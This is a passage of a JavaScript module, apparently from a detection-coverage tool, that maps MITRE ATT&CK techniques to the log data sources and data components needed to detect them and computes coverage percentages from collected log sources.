  // OS API Components
  { id: 'DC0021', name: 'OS API Execution', dataSourceId: 'DS0009', description: 'Calls to operating system APIs', platform: 'Enterprise,ICS,Mobile' },
  
  // Permissions Components (Mobile)
  { id: 'DC0116', name: 'Permissions Request', dataSourceId: null, description: 'System prompts for new permissions', platform: 'Mobile' },
  { id: 'DC0114', name: 'Permissions Requests', dataSourceId: null, description: 'Permissions declared in app manifest', platform: 'Mobile' },
  
  // Pod/Kubernetes Components
  { id: 'DC0019', name: 'Pod Creation', dataSourceId: 'DS0032', description: 'Deployment of new pods in Kubernetes', platform: 'Enterprise' },
  { id: 'DC0037', name: 'Pod Enumeration', dataSourceId: 'DS0032', description: 'Listing pods in containerized cluster', platform: 'Enterprise' },
  { id: 'DC0030', name: 'Pod Modification', dataSourceId: 'DS0032', description: 'Changes to pod configuration or control data', platform: 'Enterprise' },
  
  // Process Components
  { id: 'DC0035', name: 'Process Access', dataSourceId: 'DS0009', description: 'One process opening another for memory/handle access', platform: 'Enterprise' },
  { id: 'DC0032', name: 'Process Creation', dataSourceId: 'DS0009', description: 'New process initialized (parent-child, arguments)', platform: 'Enterprise,ICS,Mobile' },
  { id: 'DC0107', name: 'Process History/Live Data', dataSourceId: null, description: 'Historical or real-time process telemetry', platform: 'ICS' },
  { id: 'DC0034', name: 'Process Metadata', dataSourceId: 'DS0009', description: 'Process context: environment variables, image name, owner', platform: 'Enterprise,ICS,Mobile' },
  { id: 'DC0020', name: 'Process Modification', dataSourceId: 'DS0009', description: 'Changes to running process (memory writes, injection)', platform: 'Enterprise' },
  { id: 'DC0033', name: 'Process Termination', dataSourceId: 'DS0009', description: 'Exit or termination of running process', platform: 'Enterprise,ICS,Mobile' },
  { id: 'DC0109', name: 'Process/Event Alarm', dataSourceId: null, description: 'Process alarms indicating unusual activity', platform: 'ICS' },
  
  // Protected Configuration (Mobile)
  { id: 'DC0115', name: 'Protected Configuration', dataSourceId: null, description: 'Device config options not used by benign apps', platform: 'Mobile' },
  
  // Response/Scan Components
  { id: 'DC0104', name: 'Response Content', dataSourceId: null, description: 'Captured traffic from internet scan responses', platform: 'Enterprise' },
  { id: 'DC0106', name: 'Response Metadata', dataSourceId: null, description: 'Scan results: open ports, services, versions', platform: 'Enterprise' },
  
  // Scheduled Job Components
  { id: 'DC0001', name: 'Scheduled Job Creation', dataSourceId: 'DS0003', description: 'Establishment of scheduled task/job', platform: 'Enterprise,ICS' },
  { id: 'DC0005', name: 'Scheduled Job Metadata', dataSourceId: 'DS0003', description: 'Scheduled job attributes: name, timing, commands', platform: 'Enterprise,ICS' },
  { id: 'DC0012', name: 'Scheduled Job Modification', dataSourceId: 'DS0003', description: 'Changes to scheduled job parameters or timing', platform: 'Enterprise,ICS' },
  
  // Script Components
  { id: 'DC0029', name: 'Script Execution', dataSourceId: 'DS0012', description: 'Execution of text files containing code', platform: 'Enterprise,ICS' },
  
  // Service Components
  { id: 'DC0060', name: 'Service Creation', dataSourceId: 'DS0019', description: 'Registration of new service or daemon', platform: 'Enterprise,ICS' },
  { id: 'DC0041', name: 'Service Metadata', dataSourceId: 'DS0019', description: 'Service attributes: name, executable, start type', platform: 'Enterprise,ICS' },
  { id: 'DC0065', name: 'Service Modification', dataSourceId: 'DS0019', description: 'Changes to service name, start type, parameters', platform: 'Enterprise,ICS' },
  
  // Snapshot Components
  { id: 'DC0057', name: 'Snapshot Creation', dataSourceId: 'DS0025', description: 'Point-in-time copy of cloud storage, VM, or database', platform: 'Enterprise' },
  { id: 'DC0049', name: 'Snapshot Deletion', dataSourceId: 'DS0025', description: 'Removal of cloud snapshot', platform: 'Enterprise' },
  { id: 'DC0047', name: 'Snapshot Enumeration', dataSourceId: 'DS0025', description: 'Listing snapshots in cloud environment', platform: 'Enterprise' },
  { id: 'DC0062', name: 'Snapshot Metadata', dataSourceId: 'DS0025', description: 'Snapshot attributes: ID, type, status', platform: 'Enterprise' },
  { id: 'DC0058', name: 'Snapshot Modification', dataSourceId: 'DS0025', description: 'Changes to snapshot metadata or settings', platform: 'Enterprise' },
  
  // Social Media Components
  { id: 'DC0052', name: 'Social Media', dataSourceId: null, description: 'Social media used for recon or influence operations', platform: 'Enterprise' },
  
  // Software Components (ICS)
  { id: 'DC0111', name: 'Software', dataSourceId: null, description: 'Software/applications deployed with versions and identifiers', platform: 'ICS' },
  
  // System Components (Mobile)
  { id: 'DC0117', name: 'System Notifications', dataSourceId: null, description: 'OS-generated notifications', platform: 'Mobile' },
  { id: 'DC0118', name: 'System Settings', dataSourceId: null, description: 'User-visible device settings', platform: 'Mobile' },
  
  // User Account Components
  { id: 'DC0002', name: 'User Account Authentication', dataSourceId: 'DS0002', description: 'Authentication attempts (successful and failed)', platform: 'Enterprise,ICS' },
  { id: 'DC0014', name: 'User Account Creation', dataSourceId: 'DS0002', description: 'New user, service, or machine account creation', platform: 'Enterprise' },
  { id: 'DC0009', name: 'User Account Deletion', dataSourceId: 'DS0002', description: 'Removal of user/service account', platform: 'Enterprise' },
  { id: 'DC0013', name: 'User Account Metadata', dataSourceId: 'DS0002', description: 'Account attributes: username, user ID, environment', platform: 'Enterprise' },
  { id: 'DC0010', name: 'User Account Modification', dataSourceId: 'DS0002', description: 'Changes to user account attributes, permissions, roles', platform: 'Enterprise' },
  
  // Volume Components
  { id: 'DC0097', name: 'Volume Creation', dataSourceId: 'DS0025', description: 'Provisioning of block storage volumes', platform: 'Enterprise' },
  { id: 'DC0098', name: 'Volume Deletion', dataSourceId: 'DS0025', description: 'Removal of cloud or on-prem storage volume', platform: 'Enterprise' },
  { id: 'DC0095', name: 'Volume Enumeration', dataSourceId: 'DS0025', description: 'Listing cloud volumes (AWS describe-volumes)', platform: 'Enterprise' },
  { id: 'DC0100', name: 'Volume Metadata', dataSourceId: 'DS0025', description: 'Volume attributes: id, type, state, size', platform: 'Enterprise' },
  { id: 'DC0092', name: 'Volume Modification', dataSourceId: 'DS0025', description: 'Changes to cloud volume settings (AWS modify-volume)', platform: 'Enterprise' },
  
  // Web Credential Components
  { id: 'DC0006', name: 'Web Credential Creation', dataSourceId: 'DS0002', description: 'New web credential material (Windows EID 1200, 4769)', platform: 'Enterprise' },
  { id: 'DC0007', name: 'Web Credential Usage', dataSourceId: 'DS0002', description: 'Web credential authentication attempt (Windows EID 1202)', platform: 'Enterprise' },
  
  // Windows Registry Components
  { id: 'DC0050', name: 'Windows Registry Key Access', dataSourceId: 'DS0024', description: 'Opening registry key to read value', platform: 'Enterprise' },
  { id: 'DC0056', name: 'Windows Registry Key Creation', dataSourceId: 'DS0024', description: 'Construction of new registry key', platform: 'Enterprise' },
  { id: 'DC0045', name: 'Windows Registry Key Deletion', dataSourceId: 'DS0024', description: 'Removal of registry key (ICS, Enterprise)', platform: 'Enterprise,ICS' },
  { id: 'DC0063', name: 'Windows Registry Key Modification', dataSourceId: 'DS0024', description: 'Changes to registry key or values', platform: 'Enterprise,ICS' },
  
  // WMI Components
  { id: 'DC0008', name: 'WMI Creation', dataSourceId: 'DS0005', description: 'WMI object construction (filter, consumer, subscription)', platform: 'Enterprise' },
];

// Map data component IDs to their parent data source
export const dataComponentToDataSource = mitreDataComponents.reduce((acc, dc) => {
  if (dc.dataSourceId) {
    acc[dc.id] = dc.dataSourceId;
  }
  return acc;
}, {});

// Get data components for a specific data source
export const getDataComponentsForDataSource = (dataSourceId) => {
  return mitreDataComponents.filter(dc => dc.dataSourceId === dataSourceId);
};

// MITRE ATT&CK Data Sources (v18+)
// Maps what types of telemetry detect which activities
export const mitreDataSources = [
  // Process-based data sources
  { 
    id: 'DS0009', 
    name: 'Process', 
    url: 'https://attack.mitre.org/datasources/DS0009',
    description: 'Information about instances of computer programs running',
    componentIds: ['DC0032', 'DC0033', 'DC0035', 'DC0020', 'DC0021', 'DC0034', 'DC0016', 'DC0048'],
    logSourceCategories: ['Endpoint', 'Security'],
    logSourceExamples: ['Windows Security', 'Sysmon', 'EDR', 'Linux Auditd']
  },
  // Command execution
  { 
    id: 'DS0017', 
    name: 'Command', 
    url: 'https://attack.mitre.org/datasources/DS0017',
    description: 'Command execution telemetry',
    componentIds: ['DC0064'],
    logSourceCategories: ['Endpoint', 'Security'],
    logSourceExamples: ['Windows PowerShell', 'Sysmon', 'EDR', 'Bash History']
  },
  // File-based data sources
  { 
    id: 'DS0022', 
    name: 'File', 
    url: 'https://attack.mitre.org/datasources/DS0022',
    description: 'Information about file objects',
    componentIds: ['DC0039', 'DC0040', 'DC0061', 'DC0055', 'DC0059', 'DC0054', 'DC0042', 'DC0046'],
    logSourceCategories: ['Endpoint', 'Security'],
    logSourceExamples: ['Sysmon', 'EDR', 'FIM', 'Windows Security']
  },
  // Network-based data sources
  { 
    id: 'DS0029', 
    name: 'Network Traffic', 
    url: 'https://attack.mitre.org/datasources/DS0029',
    description: 'Network communications and connections',
    componentIds: ['DC0082', 'DC0085', 'DC0078', 'DC0102', 'DC0043', 'DC0044', 'DC0053', 'DC0051'],
    logSourceCategories: ['Network', 'Security'],
    logSourceExamples: ['Firewall', 'Zeek', 'IDS/IPS', 'NetFlow', 'Proxy']
  },
  // User account data sources
  { 
    id: 'DS0002', 
    name: 'User Account', 
    url: 'https://attack.mitre.org/datasources/DS0002',
    description: 'User account authentication and authorization',
    componentIds: ['DC0002', 'DC0014', 'DC0010', 'DC0009', 'DC0013', 'DC0006', 'DC0007'],
    logSourceCategories: ['Identity', 'Security'],
    logSourceExamples: ['Windows Security', 'Active Directory', 'Azure AD', 'Okta', 'Linux Auth']
  },
  // Logon session data sources
  { 
    id: 'DS0028', 
    name: 'Logon Session', 
    url: 'https://attack.mitre.org/datasources/DS0028',
    description: 'Session establishment and activity',
    componentIds: ['DC0067', 'DC0088'],
    logSourceCategories: ['Identity', 'Endpoint'],
    logSourceExamples: ['Windows Security', 'VPN', 'Azure AD', 'Linux PAM']
  },
  // Windows Registry
  { 
    id: 'DS0024', 
    name: 'Windows Registry', 
    url: 'https://attack.mitre.org/datasources/DS0024',
    description: 'Windows Registry key and value operations',
    componentIds: ['DC0056', 'DC0063', 'DC0045', 'DC0050'],
    logSourceCategories: ['Endpoint'],
    logSourceExamples: ['Sysmon', 'Windows Security', 'EDR']
  },
  // Active Directory
  { 
    id: 'DS0026', 
    name: 'Active Directory', 
    url: 'https://attack.mitre.org/datasources/DS0026',
    description: 'Active Directory object operations',
    componentIds: ['DC0087', 'DC0066', 'DC0068', 'DC0084', 'DC0071', 'DC0099', 'DC0105', 'DC0094'],
    logSourceCategories: ['Identity'],
    logSourceExamples: ['Domain Controller', 'Azure AD', 'Active Directory']
  },
  // Scheduled Jobs
  { 
    id: 'DS0003', 
    name: 'Scheduled Job', 
    url: 'https://attack.mitre.org/datasources/DS0003',
    description: 'Scheduled task/job operations',
    componentIds: ['DC0001', 'DC0012', 'DC0005'],
    logSourceCategories: ['Endpoint'],
    logSourceExamples: ['Windows Task Scheduler', 'Sysmon', 'Linux Cron']
  },
  // Service
  { 
    id: 'DS0019', 
    name: 'Service', 
    url: 'https://attack.mitre.org/datasources/DS0019',
    description: 'Service/daemon operations',
    componentIds: ['DC0060', 'DC0065', 'DC0041'],
    logSourceCategories: ['Endpoint'],
    logSourceExamples: ['Windows System', 'Sysmon', 'Linux Systemd']
  },
  // Driver/Module
  { 
    id: 'DS0027', 
    name: 'Driver', 
    url: 'https://attack.mitre.org/datasources/DS0027',
    description: 'Kernel driver/module operations',
    componentIds: ['DC0079', 'DC0074', 'DC0031'],
    logSourceCategories: ['Endpoint', 'Security'],
    logSourceExamples: ['Sysmon', 'Windows Security', 'Linux Kernel']
  },
  // Script
  { 
    id: 'DS0012', 
    name: 'Script', 
    url: 'https://attack.mitre.org/datasources/DS0012',
    description: 'Script execution telemetry',
    componentIds: ['DC0029'],
    logSourceCategories: ['Endpoint'],
    logSourceExamples: ['Windows PowerShell', 'Sysmon', 'EDR']
  },
  // Application Log
  { 
    id: 'DS0015', 
    name: 'Application Log', 
    url: 'https://attack.mitre.org/datasources/DS0015',
    description: 'Application-level logging',
    componentIds: ['DC0038'],
    logSourceCategories: ['Application'],
    logSourceExamples: ['Web Server', 'Database', 'Custom Apps']
  },
  // Cloud
  { 
    id: 'DS0025', 
    name: 'Cloud Service', 
    url: 'https://attack.mitre.org/datasources/DS0025',
    description: 'Cloud service and storage operations',
    componentIds: ['DC0083', 'DC0069', 'DC0090', 'DC0070', 'DC0025', 'DC0024', 'DC0022', 'DC0017', 'DC0027', 'DC0023', 'DC0057', 'DC0049', 'DC0047', 'DC0062', 'DC0058', 'DC0097', 'DC0098', 'DC0095', 'DC0100', 'DC0092'],
    logSourceCategories: ['Cloud'],
    logSourceExamples: ['AWS CloudTrail', 'Azure Activity', 'GCP Audit']
  },
  // DNS
  { 
    id: 'DS0013', 
    name: 'Domain Name', 
    url: 'https://attack.mitre.org/datasources/DS0013',
    description: 'DNS query and response data',
    componentIds: ['DC0103', 'DC0096', 'DC0101'],
    logSourceCategories: ['Network'],
    logSourceExamples: ['DNS Server', 'Firewall', 'EDR', 'Zeek']
  },
  // Firmware
  { 
    id: 'DS0001', 
    name: 'Firmware', 
    url: 'https://attack.mitre.org/datasources/DS0001',
    description: 'Firmware modification detection',
    componentIds: ['DC0004'],
    logSourceCategories: ['Endpoint'],
    logSourceExamples: ['UEFI/BIOS', 'TPM', 'EDR']
  },
  // WMI
  { 
    id: 'DS0005', 
    name: 'WMI', 
    url: 'https://attack.mitre.org/datasources/DS0005',
    description: 'Windows Management Instrumentation',
    componentIds: ['DC0008'],
    logSourceCategories: ['Endpoint'],
    logSourceExamples: ['Sysmon', 'Windows Security', 'EDR']
  },
  // Certificate
  { 
    id: 'DS0037', 
    name: 'Certificate', 
    url: 'https://attack.mitre.org/datasources/DS0037',
    description: 'Certificate operations',
    componentIds: ['DC0093'],
    logSourceCategories: ['Identity', 'Security'],
    logSourceExamples: ['CA Server', 'Active Directory']
  },
  // Container
  { 
    id: 'DS0032', 
    name: 'Container', 
    url: 'https://attack.mitre.org/datasources/DS0032',
    description: 'Container runtime operations',
    componentIds: ['DC0072', 'DC0077', 'DC0091', 'DC0019', 'DC0037', 'DC0030'],
    logSourceCategories: ['Cloud', 'Endpoint'],
    logSourceExamples: ['Docker', 'Kubernetes', 'Container Runtime']
  },
  // Image
  { 
    id: 'DS0007', 
    name: 'Image', 
    url: 'https://attack.mitre.org/datasources/DS0007',
    description: 'VM/Container image and instance operations',
    componentIds: ['DC0015', 'DC0036', 'DC0026', 'DC0028', 'DC0076', 'DC0081', 'DC0075', 'DC0086', 'DC0073', 'DC0080', 'DC0089'],
    logSourceCategories: ['Cloud'],
    logSourceExamples: ['Cloud Provider', 'VMware', 'Container Registry']
  },
  // Malware Repository
  { 
    id: 'DS0004', 
    name: 'Malware Repository', 
    url: 'https://attack.mitre.org/datasources/DS0004',
    description: 'Malware detection and analysis',
    componentIds: ['DC0011', 'DC0003'],
    logSourceCategories: ['Security'],
    logSourceExamples: ['Antivirus', 'EDR', 'Sandbox']
  },
  // Sensor Health
  { 
    id: 'DS0035', 
    name: 'Sensor Health', 
    url: 'https://attack.mitre.org/datasources/DS0035',
    description: 'Security sensor status',
    componentIds: ['DC0018'],
    logSourceCategories: ['Security'],
    logSourceExamples: ['EDR', 'Agent Health']
  },
];

// Map log source categories to MITRE Data Sources they provide
export const categoryToDataSources = {
  'Network': ['DS0029', 'DS0013'],
  'Endpoint': ['DS0009', 'DS0017', 'DS0022', 'DS0024', 'DS0003', 'DS0019', 'DS0027', 'DS0012', 'DS0005'],
  'Application': ['DS0015'],
  'Cloud': ['DS0025', 'DS0032', 'DS0007'],
  'Identity': ['DS0002', 'DS0028', 'DS0026', 'DS0037'],
  'Security': ['DS0009', 'DS0022', 'DS0029', 'DS0002', 'DS0004'],
  'Database': ['DS0015'],
  'Email': ['DS0033'],
  'Web': ['DS0015', 'DS0029'],
  'Other': [],
};

// Map MITRE techniques to data sources they require for detection
// This enables coverage calculation
export const techniqueToDataSources = {
  // Initial Access
  'T1078': ['DS0002', 'DS0028'], // Valid Accounts
  'T1078.001': ['DS0002', 'DS0028'], // Valid Accounts: Default Accounts
  'T1078.002': ['DS0002', 'DS0028', 'DS0026'], // Valid Accounts: Domain Accounts
  'T1110': ['DS0002', 'DS0028'], // Brute Force
  'T1110.001': ['DS0002', 'DS0028'], // Brute Force: Password Guessing
  'T1566': ['DS0033'], // Phishing
  'T1566.001': ['DS0033'], // Phishing: Spearphishing Attachment
  'T1566.002': ['DS0033'], // Phishing: Spearphishing Link
  
  // Execution
  'T1059': ['DS0017', 'DS0009'], // Command and Scripting Interpreter
  'T1059.001': ['DS0017', 'DS0009', 'DS0012'], // PowerShell
  'T1059.003': ['DS0017', 'DS0009'], // Windows Command Shell
  'T1204': ['DS0009', 'DS0022'], // User Execution
  'T1204.002': ['DS0009', 'DS0022'], // User Execution: Malicious File
  
  // Persistence
  'T1053': ['DS0003'], // Scheduled Task/Job
  'T1053.005': ['DS0003', 'DS0009'], // Scheduled Task
  'T1547': ['DS0024', 'DS0009'], // Boot or Logon Autostart Execution
  'T1547.001': ['DS0024', 'DS0009'], // Registry Run Keys
  'T1543': ['DS0019', 'DS0009'], // Create or Modify System Process
  'T1543.003': ['DS0019', 'DS0009'], // Windows Service
  
  // Privilege Escalation
  'T1068': ['DS0009'], // Exploitation for Privilege Escalation
  'T1548': ['DS0009', 'DS0017'], // Abuse Elevation Control Mechanism
  'T1548.002': ['DS0009', 'DS0017'], // Bypass User Account Control
  
  // Defense Evasion
  'T1070': ['DS0022', 'DS0009'], // Indicator Removal
  'T1070.001': ['DS0022', 'DS0009'], // Clear Windows Event Logs
  'T1562': ['DS0009', 'DS0019'], // Impair Defenses
  'T1562.001': ['DS0009', 'DS0019'], // Disable or Modify Tools
  'T1027': ['DS0022', 'DS0009'], // Obfuscated Files or Information
  
  // Credential Access
  'T1003': ['DS0009', 'DS0022'], // OS Credential Dumping
  'T1003.001': ['DS0009'], // LSASS Memory
  'T1003.003': ['DS0009', 'DS0022'], // NTDS
  'T1558': ['DS0028', 'DS0026'], // Steal or Forge Kerberos Tickets
  'T1558.003': ['DS0028', 'DS0026'], // Kerberoasting
  
  // Discovery
  'T1087': ['DS0009', 'DS0017'], // Account Discovery
  'T1087.001': ['DS0009', 'DS0017'], // Local Account
  'T1087.002': ['DS0009', 'DS0017', 'DS0026'], // Domain Account
  'T1046': ['DS0029'], // Network Service Discovery
  'T1082': ['DS0009', 'DS0017'], // System Information Discovery
  'T1083': ['DS0009', 'DS0017'], // File and Directory Discovery
  
  // Lateral Movement
  'T1021': ['DS0028', 'DS0029'], // Remote Services
  'T1021.001': ['DS0028', 'DS0029'], // Remote Desktop Protocol
  'T1021.002': ['DS0028', 'DS0029'], // SMB/Windows Admin Shares
  'T1021.006': ['DS0028', 'DS0005'], // Windows Remote Management
  'T1570': ['DS0029', 'DS0022'], // Lateral Tool Transfer
  
  // Collection
  'T1005': ['DS0022', 'DS0009'], // Data from Local System
  'T1039': ['DS0022', 'DS0029'], // Data from Network Shared Drive
  'T1114': ['DS0033'], // Email Collection
  
  // Command and Control
  'T1071': ['DS0029'], // Application Layer Protocol
  'T1071.001': ['DS0029'], // Web Protocols
  'T1105': ['DS0029', 'DS0022'], // Ingress Tool Transfer
  'T1573': ['DS0029'], // Encrypted Channel
  
  // Exfiltration
  'T1048': ['DS0029'], // Exfiltration Over Alternative Protocol
  'T1048.003': ['DS0029'], // Exfiltration Over Unencrypted Non-C2 Protocol
  'T1567': ['DS0029'], // Exfiltration Over Web Service
  'T1567.002': ['DS0029'], // Exfiltration to Cloud Storage
  
  // Impact
  'T1486': ['DS0022', 'DS0009'], // Data Encrypted for Impact
  'T1490': ['DS0009', 'DS0017'], // Inhibit System Recovery
  'T1489': ['DS0019', 'DS0009'], // Service Stop
};

// Map tactics to techniques covered in validation library
export const tacticTechniques = {
  'Initial Access': ['T1078.001', 'T1078.002', 'T1110.001', 'T1566.001'],
  'Execution': ['T1059.001', 'T1059.003', 'T1204.002'],
  'Persistence': ['T1053.005', 'T1547.001', 'T1543.003'],
  'Privilege Escalation': ['T1548.002'],
  'Defense Evasion': ['T1070.001', 'T1562.001', 'T1027'],
  'Credential Access': ['T1003.001', 'T1003.003', 'T1558.003'],
  'Discovery': ['T1087.001', 'T1087.002', 'T1046', 'T1082', 'T1083'],
  'Lateral Movement': ['T1021.001', 'T1021.002', 'T1021.006', 'T1570'],
  'Collection': ['T1005', 'T1039', 'T1114.002'],
  'Command and Control': ['T1071.001', 'T1105', 'T1573.002'],
  'Exfiltration': ['T1048.003', 'T1567.002'],
  'Impact': ['T1486', 'T1490'],
};

// Helper function to get all techniques from validation test library
export const getValidationTechniques = () => {
  return [...new Set(validationTestLibrary.map(t => t.technique))];
};

// Helper function to get techniques by tactic from validation tests
export const getTestsByTactic = (tactic) => {
  return validationTestLibrary.filter(t => t.tactic === tactic);
};

// Helper function to calculate MITRE coverage from sources
export const calculateMitreCoverage = (sources) => {
  // Collect all data sources provided by collected/partial log sources
  const providedDataSources = new Set();
  
  sources
    .filter(s => s.status === 'collected' || s.status === 'partial')
    .forEach(source => {
      const categoryDS = categoryToDataSources[source.category] || [];
      categoryDS.forEach(ds => providedDataSources.add(ds));
    });
  
  // Calculate technique coverage
  const techniqueCoverage = {};
  Object.entries(techniqueToDataSources).forEach(([technique, requiredDS]) => {
    const covered = requiredDS.filter(ds => providedDataSources.has(ds));
    const coverage = requiredDS.length > 0 ? (covered.length / requiredDS.length) * 100 : 0;
    techniqueCoverage[technique] = {
      required: requiredDS,
      covered: covered,
      percentage: Math.round(coverage),
      status: coverage >= 100 ? 'full' : coverage >= 50 ? 'partial' : 'none'
    };
  });
  
  return {
    dataSourcesProvided: [...providedDataSources],
    techniqueCoverage,
    summary: {
      totalTechniques: Object.keys(techniqueToDataSources).length,
      fullyCovered: Object.values(techniqueCoverage).filter(t => t.status === 'full').length,
      partiallyCovered: Object.values(techniqueCoverage).filter(t => t.status === 'partial').length,
      notCovered: Object.values(techniqueCoverage).filter(t => t.status === 'none').length,
    }
  };
};

// Helper function to get MITRE coverage for a specific source
export const getSourceMitreCoverage = (source) => {
  const dataSourceIds = categoryToDataSources[source.category] || [];
  const dataSources = dataSourceIds.map(id => mitreDataSources.find(ds => ds.id === id)).filter(Boolean);
  
  // Find techniques this source helps detect
  const techniques = [];
  Object.entries(techniqueToDataSources).forEach(([technique, requiredDS]) => {
    if (requiredDS.some(ds => dataSourceIds.includes(ds))) {
      const test = validationTestLibrary.find(t => t.technique === technique);
      techniques.push({
        id: technique,
        name: test?.techniqueName || technique,
        tactic: test?.tactic || 'Unknown',
        contributingDS: requiredDS.filter(ds => dataSourceIds.includes(ds))
      });
    }
  });
  
  return {
    dataSources,
    techniques,
    tacticsCovered: [...new Set(techniques.map(t => t.tactic))]
  };
};

// Get recommended log sources for missing MITRE coverage
export const getRecommendedSources = (sources, targetTechnique) => {
  const requiredDS = techniqueToDataSources[targetTechnique] || [];
  
  // Find which data sources we're missing
  const providedDS = new Set();
  sources
    .filter(s => s.status === 'collected' || s.status === 'partial')
    .forEach(source => {
      const categoryDS = categoryToDataSources[source.category] || [];
      categoryDS.forEach(ds => providedDS.add(ds));
    });
  
  const missingDS = requiredDS.filter(ds => !providedDS.has(ds));
  
  // Find data source details and recommended log sources
  const recommendations = missingDS.map(dsId => {
    const dataSource = mitreDataSources.find(ds => ds.id === dsId);
    return {
      dataSourceId: dsId,
      dataSourceName: dataSource?.name || dsId,
      description: dataSource?.description,
      recommendedCategories: dataSource?.logSourceCategories || [],
      exampleSources: dataSource?.logSourceExamples || []
    };
  });
  
  return recommendations;
};

// ============================================
// MITRE Technique to Data Components Mapping
// More granular than technique to data source - specifies exact components needed
// ============================================
export const techniqueToDataComponents = {
  // Initial Access
  'T1078': ['DC0002', 'DC0067'], // Valid Accounts - User Account Authentication, Logon Session Creation
  'T1078.001': ['DC0002', 'DC0067'], // Default Accounts
  'T1078.002': ['DC0002', 'DC0067', 'DC0071'], // Domain Accounts - includes AD Object Access
  'T1110': ['DC0002', 'DC0067'], // Brute Force
  'T1110.001': ['DC0002'], // Password Guessing
  'T1566': [], // Phishing - requires email logs (not in standard components)
  'T1566.001': [], // Spearphishing Attachment
  
  // Execution
  'T1059': ['DC0064', 'DC0032'], // Command and Scripting Interpreter
  'T1059.001': ['DC0064', 'DC0032', 'DC0029', 'DC0016'], // PowerShell - Command Execution, Process Creation, Script Execution, Module Load
  'T1059.003': ['DC0064', 'DC0032'], // Windows Command Shell
  'T1204': ['DC0032', 'DC0039'], // User Execution - Process Creation, File Creation
  'T1204.002': ['DC0032', 'DC0039', 'DC0055'], // Malicious File - includes File Access
  
  // Persistence
  'T1053': ['DC0001', 'DC0012'], // Scheduled Task/Job - Creation, Modification
  'T1053.005': ['DC0001', 'DC0012', 'DC0032'], // Scheduled Task - includes Process Creation
  'T1547': ['DC0056', 'DC0063', 'DC0032'], // Boot or Logon Autostart - Registry Key Creation/Modification, Process Creation
  'T1547.001': ['DC0056', 'DC0063', 'DC0032'], // Registry Run Keys
  'T1543': ['DC0060', 'DC0065', 'DC0032'], // Create or Modify System Process - Service Creation/Modification
  'T1543.003': ['DC0060', 'DC0065', 'DC0032'], // Windows Service
  
  // Privilege Escalation
  'T1068': ['DC0032', 'DC0020'], // Exploitation for Privilege Escalation - Process Creation, Process Modification
  'T1548': ['DC0032', 'DC0064'], // Abuse Elevation Control Mechanism
  'T1548.002': ['DC0032', 'DC0064', 'DC0063'], // Bypass UAC - includes Registry Modification
  
  // Defense Evasion
  'T1070': ['DC0040', 'DC0032'], // Indicator Removal - File Deletion
  'T1070.001': ['DC0040', 'DC0064'], // Clear Windows Event Logs - File Deletion, Command Execution
  'T1055': ['DC0035', 'DC0020', 'DC0021'], // Process Injection - Process Access, Modification, OS API Execution
  'T1055.001': ['DC0035', 'DC0020', 'DC0021'], // DLL Injection
  'T1562': ['DC0064', 'DC0065'], // Impair Defenses - Command Execution, Service Modification
  'T1562.001': ['DC0064', 'DC0063'], // Disable or Modify Tools - Registry Modification
  
  // Credential Access
  'T1003': ['DC0035', 'DC0064', 'DC0055'], // OS Credential Dumping - Process Access, Command Execution, File Access
  'T1003.001': ['DC0035', 'DC0064', 'DC0021'], // LSASS Memory
  'T1003.003': ['DC0055', 'DC0064'], // NTDS - File Access
  'T1558': ['DC0084', 'DC0002'], // Steal or Forge Kerberos Tickets - AD Credential Request, User Account Authentication
  'T1558.003': ['DC0084', 'DC0002'], // Kerberoasting
  
  // Discovery
  'T1082': ['DC0064', 'DC0032'], // System Information Discovery
  'T1083': ['DC0064', 'DC0032'], // File and Directory Discovery
  'T1087': ['DC0064', 'DC0032', 'DC0071'], // Account Discovery - includes AD Object Access
  'T1087.002': ['DC0064', 'DC0071'], // Domain Account
  'T1069': ['DC0064', 'DC0099'], // Permission Groups Discovery - Group Enumeration
  'T1069.002': ['DC0064', 'DC0099'], // Domain Groups
  'T1018': ['DC0064', 'DC0082'], // Remote System Discovery - Network Connection Creation
  
  // Lateral Movement
  'T1021': ['DC0067', 'DC0082'], // Remote Services - Logon Session Creation, Network Connection Creation
  'T1021.001': ['DC0067', 'DC0082'], // Remote Desktop Protocol
  'T1021.002': ['DC0067', 'DC0082', 'DC0102'], // SMB/Windows Admin Shares - Network Share Access
  'T1021.006': ['DC0067', 'DC0082', 'DC0064'], // Windows Remote Management
  
  // Collection
  'T1560': ['DC0064', 'DC0032', 'DC0039'], // Archive Collected Data - Command Execution, Process Creation, File Creation
  'T1560.001': ['DC0064', 'DC0032'], // Archive via Utility
  'T1005': ['DC0055', 'DC0064'], // Data from Local System - File Access
  'T1039': ['DC0102', 'DC0055'], // Data from Network Shared Drive - Network Share Access, File Access
  
  // Command and Control
  'T1071': ['DC0078', 'DC0085'], // Application Layer Protocol - Network Traffic Flow, Content
  'T1071.001': ['DC0078', 'DC0085'], // Web Protocols
  'T1095': ['DC0082', 'DC0078'], // Non-Application Layer Protocol - Network Connection Creation
  'T1572': ['DC0082', 'DC0078', 'DC0085'], // Protocol Tunneling
  'T1090': ['DC0082', 'DC0078'], // Proxy - Network Connection Creation
  
  // Exfiltration
  'T1041': ['DC0082', 'DC0078', 'DC0085'], // Exfiltration Over C2 Channel - Network Connection, Traffic Flow/Content
  'T1567': ['DC0082', 'DC0078'], // Exfiltration Over Web Service
  'T1567.002': ['DC0082', 'DC0078'], // Exfiltration to Cloud Storage
  
  // Impact
  'T1486': ['DC0039', 'DC0061', 'DC0032'], // Data Encrypted for Impact - File Creation, Modification, Process Creation
  'T1489': ['DC0065', 'DC0064'], // Service Stop - Service Modification, Command Execution
  'T1490': ['DC0064', 'DC0032', 'DC0040'], // Inhibit System Recovery - Command Execution, Process Creation, File Deletion
};

// ============================================
// Enhanced Helper Functions for Data Components
// ============================================

// Get data components provided by a source category
export const getCategoryDataComponents = (category) => {
  const dataSourceIds = categoryToDataSources[category] || [];
  const componentIds = new Set();
  
  dataSourceIds.forEach(dsId => {
    const dataSource = mitreDataSources.find(ds => ds.id === dsId);
    if (dataSource?.componentIds) {
      dataSource.componentIds.forEach(cId => componentIds.add(cId));
    }
  });
  
  return [...componentIds].map(cId => mitreDataComponents.find(dc => dc.id === cId)).filter(Boolean);
};

// Calculate MITRE coverage at data component level
export const calculateComponentCoverage = (sources) => {
  // Collect all data components provided by collected/partial sources
  const providedComponents = new Set();
  
  sources
    .filter(s => s.status === 'collected' || s.status === 'partial')
    .forEach(source => {
      const components = getCategoryDataComponents(source.category);
      components.forEach(comp => providedComponents.add(comp.id));
    });
  
  // Calculate technique coverage at component level
  const techniqueCoverage = {};
  Object.entries(techniqueToDataComponents).forEach(([technique, requiredComponents]) => {
